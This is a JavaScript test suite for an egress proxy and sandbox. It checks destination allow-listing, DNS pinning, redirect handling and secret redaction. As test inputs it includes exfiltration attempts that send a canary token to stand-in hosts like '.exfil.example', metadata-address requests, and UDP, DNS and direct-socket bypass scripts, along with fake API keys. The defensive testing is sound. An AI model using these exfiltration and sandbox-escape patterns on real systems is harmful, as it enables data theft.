// X-504: outbound access is confined to declared destinations at a mediated
// boundary, secrets are filtered before anything leaves, and a denial leaves a
// record that carries a class and a reason but no payload.
//
// The proxy tests use real loopback servers as the "remote" destinations (nothing
// leaves the machine). The boundary tests run real child and grandchild
// processes under the sandbox and try to bypass the proxy with direct sockets.
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import dgram from 'node:dgram';
import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';
import { startMediationProxy } from '../../src/capabilities/proxy.js';
import { redactOutbound, sanitizeLogText, denialRecord, destinationClass } from '../../src/capabilities/outbound.js';
import { classifyAddress, normalizeHost } from '../../src/capabilities/address.js';
import { decide } from '../../src/capabilities/decide.js';
import { verifyEgressAuditLog } from '../../src/egress/audit.js';
import { SKIP, bind, ctxFor, run, tmp, recordingServer, echoServer, viaProxy, sleep } from './helpers.js';

const CANARY = 'CANARY-NET-7f3a91c2d8e04b65';
const VENDOR_TOKEN = `ghp_${'A1b2C3d4E5'.repeat(4)}`;
const STRIPE = ('sk_' + 'live_4eC39HqLyjWDarjtT1zdp7dc');
const b64 = (s) => Buffer.from(s).toString('base64');

describe('[X-504.AC01] traffic is confined to declared destinations, through redirects, DNS changes and child processes', () => {
  let A; let B; let R; let E; let proxy; let bound; let resolveCalls; let resolveMap;
  before(async () => {
    A = await recordingServer();
    B = await recordingServer();
    R = await recordingServer((req, res) => {
      const to = req.url.includes('toA') ? `http://127.0.0.1:${A.port}/landed` : `http://127.0.0.1:${B.port}/landed`;
      res.writeHead(302, { location: to, 'content-type': 'text/plain' }); res.end('moved');
    });
    E = await echoServer();
    resolveCalls = []; resolveMap = {};
    bound = bind({
      network: [
        { host: '127.0.0.1', port: A.port, schemes: ['http'] },
        { host: '127.0.0.1', port: R.port, schemes: ['http'] },
        { host: '127.0.0.1', port: E.port, schemes: ['https'] },
        { host: 'allowed.test', port: A.port, schemes: ['http'], allowPrivateResolution: true },
        { host: 'pinned.test', port: A.port, schemes: ['http'], allowPrivateResolution: true, addresses: ['127.0.0.1'] },
        { host: 'plain.test', port: A.port, schemes: ['http'] },
      ],
    });
    proxy = await startMediationProxy({
      bound,
      resolve: async (host) => { resolveCalls.push(host); return resolveMap[host] ?? []; },
    });
  });
  after(async () => { await proxy.close(); await A.close(); await B.close(); await R.close(); await E.close(); });

  test('a declared destination is reachable through the proxy; an undeclared host or port is refused and never contacted', async () => {
    const ok = await viaProxy(proxy.port, { url: `http://127.0.0.1:${A.port}/hello` });
    assert.equal(ok.status, 200);
    assert.equal(ok.body, 'ok');
    const before = A.seen.requests.length;
    assert.ok(before >= 1);
    const denied = await viaProxy(proxy.port, { url: `http://127.0.0.1:${B.port}/hello` });
    assert.equal(denied.status, 403);
    assert.equal(JSON.parse(denied.body).code, 'port-not-declared', 'the host is declared, this port is not');
    const other = await viaProxy(proxy.port, { url: `http://192.0.2.1:${A.port}/` });
    assert.equal(other.status, 403);
    assert.equal(JSON.parse(other.body).code, 'destination-not-declared');
    assert.equal(B.seen.connections, 0, 'the undeclared listener never saw a connection');
    const origin = await viaProxy(proxy.port, { url: '/just-a-path' });
    assert.ok(origin.status === 403 || origin.error, 'talking to the proxy as if it were a server is not a destination');
  });

  test('a redirect is returned, never followed: the next hop is judged on its own', async () => {
    const first = await viaProxy(proxy.port, { url: `http://127.0.0.1:${R.port}/redirect-away` });
    assert.equal(first.status, 302, 'the redirect response is passed through unchanged');
    assert.equal(first.headers.location, `http://127.0.0.1:${B.port}/landed`);
    assert.equal(B.seen.connections, 0, 'the proxy did not follow the redirect');
    const hop = await viaProxy(proxy.port, { url: first.headers.location });
    assert.equal(hop.status, 403, 'the second hop meets the policy again and is refused');
    assert.equal(B.seen.connections, 0);
    const toDeclared = await viaProxy(proxy.port, { url: `http://127.0.0.1:${R.port}/toA` });
    const hop2 = await viaProxy(proxy.port, { url: toDeclared.headers.location });
    assert.equal(hop2.status, 200, 'a redirect to a declared destination is fine on its merits');
  });

  test('a host name that resolves to a loopback, private or metadata address is refused unless declared so', async () => {
    resolveMap = { 'plain.test': ['127.0.0.1'], 'allowed.test': ['127.0.0.1'] };
    const refused = await viaProxy(proxy.port, { url: `http://plain.test:${A.port}/` });
    assert.equal(refused.status, 403);
    assert.equal(JSON.parse(refused.body).code, 'dns-private-address');
    const allowed = await viaProxy(proxy.port, { url: `http://allowed.test:${A.port}/` });
    assert.equal(allowed.status, 200, 'an entry that declares private resolution may resolve there');
    resolveMap = { 'plain.test': ['169.254.169.254'] };
    assert.equal(JSON.parse((await viaProxy(proxy.port, { url: `http://plain.test:${A.port}/` })).body).code, 'dns-private-address', 'the metadata address is never reachable by name');
    resolveMap = { 'plain.test': [] };
    assert.equal((await viaProxy(proxy.port, { url: `http://plain.test:${A.port}/` })).status, 403, 'a name that does not resolve is refused');
  });

  test('a DNS answer that changes is caught by the pinned address set, and each request resolves exactly once', async () => {
    resolveMap = { 'pinned.test': ['127.0.0.1'] };
    resolveCalls.length = 0;
    const first = await viaProxy(proxy.port, { url: `http://pinned.test:${A.port}/` });
    assert.equal(first.status, 200);
    assert.equal(resolveCalls.filter((h) => h === 'pinned.test').length, 1, 'one resolution per request: what was checked is what was connected to');
    resolveMap = { 'pinned.test': ['127.0.0.1', '127.0.0.2'] };
    const changed = await viaProxy(proxy.port, { url: `http://pinned.test:${A.port}/` });
    assert.equal(changed.status, 403);
    assert.equal(JSON.parse(changed.body).code, 'dns-changed');
    resolveMap = { 'pinned.test': ['10.0.0.9'] };
    assert.equal(JSON.parse((await viaProxy(proxy.port, { url: `http://pinned.test:${A.port}/` })).body).code, 'dns-changed');
  });

  test('an https destination is an opaque tunnel, allowed only where declared for https', async () => {
    const open = (target) => new Promise((resolve) => {
      const s = net.connect(proxy.port, '127.0.0.1');
      let buf = '';
      s.on('data', (d) => {
        buf += d.toString('latin1');
        if (buf.includes('\r\n\r\n') && !s._sent) {
          s._sent = true;
          if (buf.startsWith('HTTP/1.1 200')) s.write('ping-through-tunnel');
          else { resolve({ line: buf.split('\r\n')[0], echoed: false }); s.destroy(); }
        } else if (buf.includes('ping-through-tunnel')) { resolve({ line: buf.split('\r\n')[0], echoed: true }); s.destroy(); }
      });
      s.on('error', () => resolve({ line: 'error', echoed: false }));
      s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
      setTimeout(() => { resolve({ line: 'timeout', echoed: false }); s.destroy(); }, 3000);
    });
    const ok = await open(`127.0.0.1:${E.port}`);
    assert.match(ok.line, /^HTTP\/1\.1 200/);
    assert.equal(ok.echoed, true);
    const noScheme = await open(`127.0.0.1:${A.port}`);
    assert.match(noScheme.line, /^HTTP\/1\.1 403/, 'declared for http, not for a tunnel');
    const undeclared = await open(`127.0.0.1:${B.port}`);
    assert.match(undeclared.line, /^HTTP\/1\.1 403/);
    assert.equal(B.seen.connections, 0);
  });

  test('address classes and strict host forms back the decisions', () => {
    const classes = { '127.0.0.1': 'loopback', '::1': 'loopback', '10.1.2.3': 'private', '172.16.0.1': 'private', '192.168.1.1': 'private', '169.254.169.254': 'metadata', '169.254.1.1': 'link-local', '0.0.0.0': 'unspecified', '::ffff:127.0.0.1': 'loopback', '::ffff:7f00:1': 'loopback', 'fe80::1': 'link-local', 'fd12::1': 'private', '8.8.8.8': 'public', '2606:4700::1111': 'public', 'not-an-ip': 'invalid' };
    for (const [ip, cls] of Object.entries(classes)) assert.equal(classifyAddress(ip), cls, ip);
    for (const bad of ['2130706433', '0x7f.1', '127.1', '', 'a b', 'ex ample.com', '-bad.example', 'ünicode.example']) assert.equal(normalizeHost(bad).ok, false, `${bad} must be refused`);
    assert.equal(normalizeHost('API.Example.COM.').host, 'api.example.com');
    const b = bind({ network: [{ host: 'api.example.com', port: 443 }] });
    assert.equal(decide(b, { kind: 'network', host: 'API.example.com.', port: 443 }, ctxFor(b)).decision, 'allow');
    assert.equal(decide(b, { kind: 'network', host: '2130706433', port: 443 }, ctxFor(b)).code, 'host-invalid');
    assert.equal(decide(b, { kind: 'network', host: 'api.example.com', port: 70000 }, ctxFor(b)).code, 'port-invalid');
  });

  test('a child and a grandchild are confined to the proxy; a direct socket is refused by the operating system', { skip: SKIP }, async () => {
    const dir = tmp('x504a-');
    const aConn0 = A.seen.connections; const bConn0 = B.seen.connections;
    const direct = (port) => `new Promise(r=>{const s=require('net').connect(${port},'127.0.0.1');s.on('connect',()=>{s.destroy();r('CONNECTED')});s.on('error',e=>r(e.code));setTimeout(()=>r('TIMEOUT'),2500)})`;
    const grandchildCode = `const s=require('net').connect(${A.port},'127.0.0.1');s.on('connect',()=>{console.log('CONNECTED');process.exit(0)});s.on('error',e=>{console.log(e.code);process.exit(0)});setTimeout(()=>{console.log('TIMEOUT');process.exit(0)},2500)`;
    const script = `
const http=require('http'),cp=require('child_process');
const px=new URL(process.env.HTTP_PROXY);
const via=(p)=>new Promise(r=>{const q=http.request({host:px.hostname,port:px.port,method:'GET',path:'http://127.0.0.1:'+p+'/c',headers:{host:'127.0.0.1:'+p},agent:false},res=>{let b='';res.on('data',d=>b+=d);res.on('end',()=>r(res.statusCode))});q.on('error',e=>r(e.code));q.end()});
(async()=>{
 const out={proxyEnv:!!process.env.HTTPS_PROXY&&!!process.env.http_proxy};
 out.viaA=await via(${A.port}); out.viaB=await via(${B.port});
 out.directA=await ${direct(A.port)}; out.directB=await ${direct(B.port)};
 out.grandchildDirect=cp.execFileSync(process.execPath,['-e',${JSON.stringify(grandchildCode)}],{encoding:'utf8'}).trim();
 console.log(JSON.stringify(out));
})();`;
    const task = bind({
      filesystem: { write: [dir] },
      network: [{ host: '127.0.0.1', port: A.port, schemes: ['http'] }],
      commands: [{ executable: process.execPath, interpreter: 'scoped', args: { mode: 'exact', values: ['-e', script] } }],
      resources: { timeoutMs: 20000 },
    });
    const r = await run(task, { executable: process.execPath, args: ['-e', script] });
    assert.equal(r.executed, true, JSON.stringify({ s: r.status, c: r.code, m: r.reason, e: r.output?.stderr }));
    const out = JSON.parse(r.output.stdout.trim().split('\n').pop());
    assert.equal(out.proxyEnv, true, 'the whole tree is pointed at the proxy');
    assert.equal(out.viaA, 200, 'the declared destination works through the proxy');
    assert.equal(out.viaB, 403, 'an undeclared destination is refused by the proxy');
    assert.equal(out.directA, 'EPERM', 'a direct socket to even a declared destination is refused by the operating system');
    assert.equal(out.directB, 'EPERM');
    assert.equal(out.grandchildDirect, 'EPERM', 'a grandchild inherits the boundary');
    assert.equal(A.seen.connections - aConn0, 1, 'only the proxied request reached the declared listener');
    assert.equal(B.seen.connections - bConn0, 0, 'the undeclared listener saw nothing');
    assert.equal(r.network.stats.allowed, 1);
    assert.equal(r.network.stats.denied, 1);
    assert.equal(r.enforced, false, 'honest on this host: boundary proved, backend not advertised');
    assert.ok(r.capabilityDecisions.some((d) => d.capability === 'network' && d.mediation === 'proxy'));
  });

  test('a task that declares no destinations gets no proxy and no network at all', { skip: SKIP }, async () => {
    const dir = tmp('x504b-');
    const script = `const s=require('net').connect(${A.port},'127.0.0.1');s.on('connect',()=>{console.log(JSON.stringify({r:'CONNECTED',p:process.env.HTTP_PROXY||null}));process.exit(0)});s.on('error',e=>{console.log(JSON.stringify({r:e.code,p:process.env.HTTP_PROXY||null}));process.exit(0)});setTimeout(()=>{console.log('TIMEOUT');process.exit(0)},2500)`;
    const task = bind({ filesystem: { write: [dir] }, commands: [{ executable: process.execPath, interpreter: 'scoped', args: { mode: 'exact', values: ['-e', script] } }] });
    const before = A.seen.connections;
    const r = await run(task, { executable: process.execPath, args: ['-e', script] });
    assert.deepEqual(JSON.parse(r.output.stdout.trim()), { r: 'EPERM', p: null });
    assert.equal(r.network, null);
    assert.equal(A.seen.connections, before);
  });
});

describe('[X-504.AC02] secrets are filtered from outbound payloads and logs', () => {
  const secretRequest = () => ({
    url: `http://svc-user:hunter2-pass@127.0.0.1:1/path/${VENDOR_TOKEN}/x?token=${CANARY}&keep=1&api_key=abc123&q=${encodeURIComponent(CANARY)}`,
    headers: {
      Authorization: `Bearer ${CANARY}`, 'X-Api-Key': CANARY, Cookie: `session=${CANARY}; theme=dark`, 'X-Note': `my key is ${STRIPE}`,
      'X-Trace-Id': 'trace-123', 'Content-Type': 'application/json',
    },
    body: { name: 'widget', qty: 3, auth: { password: 'p@ss', note: `see ${CANARY}` }, items: [{ label: `tok ${VENDOR_TOKEN}` }, { b64: b64(CANARY) }], api_key: CANARY },
  });
  const forms = [CANARY, encodeURIComponent(CANARY), b64(CANARY), VENDOR_TOKEN, STRIPE, 'hunter2-pass', 'p@ss'];

  test('credentials in URLs, headers and structured bodies are removed; the rest is preserved', () => {
    const r = redactOutbound(secretRequest(), { canaries: [CANARY] });
    const text = JSON.stringify(r);
    for (const f of forms) assert.ok(!text.includes(f), `${f.slice(0, 14)}... must not survive`);
    assert.ok(r.redactions >= 8, `counted ${r.redactions}`);
    assert.equal(r.categories.userinfo, 1);
    const u = new URL(r.url);
    assert.equal(u.username, ''); assert.equal(u.password, '');
    assert.equal(u.searchParams.get('keep'), '1', 'a non-secret parameter is untouched');
    assert.equal(u.searchParams.get('token'), '[REDACTED-SECRET]');
    assert.equal(r.headers['x-trace-id'], 'trace-123');
    assert.equal(r.headers['content-type'], 'application/json');
    const body = JSON.parse(r.body);
    assert.equal(body.name, 'widget'); assert.equal(body.qty, 3);
    assert.equal(body.auth.password, '[REDACTED-SECRET]');
    assert.equal(r.headers.authorization, '[REDACTED-SECRET]');
  });

  test('form and plain-text bodies are filtered too, and clean traffic is byte-identical', () => {
    const form = redactOutbound({ url: 'http://h/x', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: `user=bob&password=${encodeURIComponent(CANARY)}&n=2` }, { canaries: [CANARY] });
    assert.ok(!form.body.includes(CANARY) && !form.body.includes(encodeURIComponent(CANARY)));
    assert.match(form.body, /user=bob/); assert.match(form.body, /n=2/);
    const text = redactOutbound({ url: 'http://h/x', body: `curl with ${VENDOR_TOKEN} and ${CANARY} end` }, { canaries: [CANARY] });
    assert.ok(!text.body.includes(VENDOR_TOKEN) && !text.body.includes(CANARY));
    const clean = { url: 'http://example.com/a/b?x=1&y=two', headers: { accept: 'application/json', 'x-trace-id': 'abc' }, body: '{"name":"widget","qty":3}' };
    const same = redactOutbound({ ...clean, headers: { ...clean.headers, 'content-type': 'application/json' } }, { canaries: [CANARY] });
    assert.equal(same.redactions, 0);
    assert.equal(same.body, clean.body);
    assert.equal(same.url, clean.url);
  });

  test('the proxy filters a forwarded plaintext request before it leaves, and the destination never sees a canary', async () => {
    const S = await recordingServer();
    const bound = bind({ network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }] });
    const px = await startMediationProxy({ bound, canaries: [CANARY] });
    try {
      const req = secretRequest();
      const url = `http://127.0.0.1:${S.port}/path/${VENDOR_TOKEN}/x?token=${CANARY}&keep=1&q=${encodeURIComponent(CANARY)}`;
      const body = JSON.stringify(req.body);
      const res = await viaProxy(px.port, { url, method: 'POST', headers: { ...req.headers, 'content-length': String(Buffer.byteLength(body)) }, body });
      assert.equal(res.status, 200);
      assert.equal(S.seen.requests.length, 1);
      const got = JSON.stringify(S.seen.requests[0]);
      for (const f of forms) assert.ok(!got.includes(f), `${f.slice(0, 14)}... reached the destination`);
      assert.equal(S.seen.requests[0].headers['x-trace-id'], 'trace-123', 'ordinary headers are forwarded');
      assert.equal(JSON.parse(S.seen.requests[0].body).name, 'widget');
      assert.ok(px.stats.redactions >= 5, `the proxy counted its redactions (${px.stats.redactions})`);
      assert.ok(!JSON.stringify(px.records).includes(CANARY));
    } finally { await px.close(); await S.close(); }
  });

  test('a body that cannot be inspected, or is too large to filter, is refused rather than forwarded', async () => {
    const S = await recordingServer();
    const bound = bind({ network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }] });
    const px = await startMediationProxy({ bound, canaries: [CANARY], maxRequestBytes: 2048 });
    try {
      const bin = Buffer.concat([Buffer.from([0, 1, 2, 3]), Buffer.from(CANARY)]).toString('latin1');
      const r1 = await viaProxy(px.port, { url: `http://127.0.0.1:${S.port}/b`, method: 'POST', headers: { 'content-length': String(bin.length), 'content-type': 'application/octet-stream' }, body: Buffer.from(bin, 'latin1') });
      assert.equal(JSON.parse(r1.body).code, 'payload-uninspectable');
      const big = 'x'.repeat(5000);
      const r2 = await viaProxy(px.port, { url: `http://127.0.0.1:${S.port}/b`, method: 'POST', headers: { 'content-length': String(big.length) }, body: big });
      assert.ok(r2.status === 403 || r2.error, 'an oversize body is refused');
      assert.equal(S.seen.requests.length, 0, 'nothing reached the destination');
    } finally { await px.close(); await S.close(); }
  });

  test('log text loses canaries and provider-shaped secrets', () => {
    const line = `GET failed for token ${VENDOR_TOKEN} with ${CANARY} and ${b64(CANARY)} on ${STRIPE}`;
    const clean = sanitizeLogText(line, [CANARY]);
    for (const f of [VENDOR_TOKEN, CANARY, b64(CANARY), STRIPE]) assert.ok(!clean.includes(f));
    assert.equal(sanitizeLogText('ordinary log line /var/x/y', [CANARY]), 'ordinary log line /var/x/y');
  });
});

describe('[X-504.AC03] a denial records the destination class and policy reason, never a payload, and direct sockets cannot bypass it', () => {
  test('a denial record carries a class, a digest, a port and a code, and nothing else', async () => {
    const S = await recordingServer();
    const bound = bind({ network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }] });
    const px = await startMediationProxy({ bound, canaries: [CANARY] });
    try {
      const hostile = `${CANARY.toLowerCase()}.exfil.example`;
      const targets = {
        [`http://${hostile}:80/secret-path/${CANARY}?token=${CANARY}`]: 'hostname',
        'http://169.254.169.254:80/latest/meta-data': 'metadata',
        'http://10.0.0.5:80/': 'private',
        'http://8.8.8.8:80/': 'public',
        [`http://127.0.0.1:${S.port + 1}/`]: 'loopback',
      };
      for (const url of Object.keys(targets)) {
        const res = await viaProxy(px.port, { url, method: 'POST', headers: { authorization: `Bearer ${CANARY}`, 'content-length': String(CANARY.length) }, body: CANARY });
        assert.equal(res.status, 403, url);
      }
      const denied = px.records.filter((r) => r.outcome === 'deny');
      assert.equal(denied.length, Object.keys(targets).length);
      assert.deepEqual(denied.map((r) => r.destinationClass).sort(), Object.values(targets).sort());
      for (const r of denied) {
        assert.deepEqual(Object.keys(r).sort(), ['code', 'destinationClass', 'hostDigest', 'outcome', 'port', 'scheme', 'taskId']);
        assert.match(r.hostDigest, /^[0-9a-f]{12}$/);
        assert.equal(r.code, r.destinationClass === 'loopback' ? 'port-not-declared' : 'destination-not-declared');
      }
      const dump = JSON.stringify(px.records);
      for (const secret of [CANARY, CANARY.toLowerCase(), 'exfil.example', 'secret-path', 'meta-data', '169.254.169.254', 'Bearer']) {
        assert.ok(!dump.includes(secret), `the record must not contain ${secret}`);
      }
      assert.equal(S.seen.requests.length, 0);
    } finally { await px.close(); await S.close(); }
  });

  test('denials land in the tamper-evident egress audit chain with the class as provider and the code as reason', async () => {
    const root = tmp('x504c-');
    fs.writeFileSync(path.join(root, 'package.json'), '{}');
    const S = await recordingServer();
    const bound = bind({ network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }] });
    const px = await startMediationProxy({ bound, canaries: [CANARY], scanRoot: root });
    try {
      await viaProxy(px.port, { url: `http://${CANARY.toLowerCase()}.exfil.example:80/p?token=${CANARY}`, method: 'POST', headers: { 'content-length': String(CANARY.length) }, body: CANARY });
      await viaProxy(px.port, { url: 'http://10.0.0.5:80/' });
      await viaProxy(px.port, { url: `http://127.0.0.1:${S.port}/allowed` });
      const log = path.join(root, '.agentic-security', 'egress-audit.log');
      const raw = fs.readFileSync(log, 'utf8');
      const lines = raw.split('\n').filter(Boolean).map((l) => JSON.parse(l));
      assert.equal(lines.length, 2, 'only denials are appended; an allowed request is not');
      assert.deepEqual(lines.map((l) => [l.provider, l.reason, l.outcome]), [['hostname', 'destination-not-declared', 'deny'], ['private', 'destination-not-declared', 'deny']]);
      assert.equal(lines[0].purpose, 'capability-network');
      assert.equal(verifyEgressAuditLog(log).ok, true, 'the chain verifies');
      for (const secret of [CANARY, CANARY.toLowerCase(), 'exfil.example', '10.0.0.5']) assert.ok(!raw.includes(secret), `the audit log must not contain ${secret}`);
      // Tampering with a line breaks the chain.
      fs.writeFileSync(log, raw.replace('"deny"', '"allow"'));
      assert.equal(verifyEgressAuditLog(log).ok, false);
    } finally { await px.close(); await S.close(); }
  });

  test('the record builder never stores the host name', () => {
    const r = denialRecord({ taskId: 't', host: `${CANARY}.evil.example`, port: 443, scheme: 'https', code: 'destination-not-declared' });
    assert.ok(!JSON.stringify(r).includes('evil'));
    assert.equal(r.destinationClass, 'hostname');
    assert.equal(destinationClass('localhost'), 'loopback');
    assert.equal(destinationClass('[::1]'), 'loopback');
    assert.equal(destinationClass('not a host'), 'invalid');
    assert.equal(denialRecord({ host: 'a.example', port: 'x', scheme: 'ftp', code: 'c' }).scheme, null);
  });

  test('datagram, name-resolution and direct-socket bypass attempts all fail inside the boundary', { skip: SKIP }, async () => {
    const dir = tmp('x504d-');
    const S = await recordingServer();
    const udp = dgram.createSocket('udp4');
    let datagrams = 0;
    udp.on('message', () => { datagrams += 1; });
    await new Promise((r) => udp.bind(0, '127.0.0.1', r));
    const udpPort = udp.address().port;
    const script = `
const dgram=require('dgram'),net=require('net'),dns=require('dns');
const t=(p)=>Promise.race([p,new Promise(r=>setTimeout(()=>r('TIMEOUT'),2500))]);
(async()=>{
 const out={};
 out.udp=await t(new Promise(r=>{const s=dgram.createSocket('udp4');s.on('error',e=>r(e.code));s.send(Buffer.from('${CANARY}'),${udpPort},'127.0.0.1',(e)=>{r(e?e.code:'SENT');s.close()})}));
 out.tcpName=await t(new Promise(r=>{const s=net.connect(${S.port},'localhost');s.on('connect',()=>r('CONNECTED'));s.on('error',e=>r(e.code))}));
 out.dns=await t(new Promise(r=>dns.lookup('exfil-${CANARY.toLowerCase()}.example',(e)=>r(e?e.code:'RESOLVED'))));
 out.unix=await t(new Promise(r=>{const s=net.connect('/var/run/mDNSResponder');s.on('connect',()=>r('CONNECTED'));s.on('error',e=>r(e.code))}));
 console.log(JSON.stringify(out));
})();`;
    try {
      const task = bind({
        filesystem: { write: [dir] },
        network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }],
        commands: [{ executable: process.execPath, interpreter: 'scoped', args: { mode: 'exact', values: ['-e', script] } }],
        resources: { timeoutMs: 20000 },
      });
      const r = await run(task, { executable: process.execPath, args: ['-e', script] });
      assert.equal(r.executed, true, JSON.stringify({ s: r.status, c: r.code, m: r.reason, e: r.output?.stderr }));
      const out = JSON.parse(r.output.stdout.trim().split('\n').pop());
      assert.notEqual(out.udp, 'SENT', 'a datagram does not leave');
      assert.notEqual(out.tcpName, 'CONNECTED', 'a connection by name does not bypass the proxy');
      assert.notEqual(out.dns, 'RESOLVED', 'the sandbox cannot resolve names');
      assert.notEqual(out.unix, 'CONNECTED', 'a local service socket is unreachable');
      await sleep(300);
      assert.equal(datagrams, 0, 'the datagram receiver saw nothing');
      assert.equal(S.seen.connections, 0, 'the declared listener saw no direct connection');
    } finally { udp.close(); await S.close(); }
  });
});
